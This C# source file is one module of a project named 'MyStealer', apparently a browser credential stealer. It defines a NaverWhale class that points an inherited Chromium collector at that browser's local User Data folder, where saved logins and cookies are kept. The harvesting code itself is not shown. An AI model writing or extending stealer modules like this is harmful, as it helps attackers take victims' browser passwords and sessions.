using System.IO;
using System;
using MyStealer.Collector.Modules.Browser;

namespace MyStealer.Collector.Modules.Browser.ChromiumBased
{
    public class NaverWhale : Chromium
    {
        public override string ModuleName => "NAVER Whale";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Naver", "Naver Whale", "User Data");
    }
}
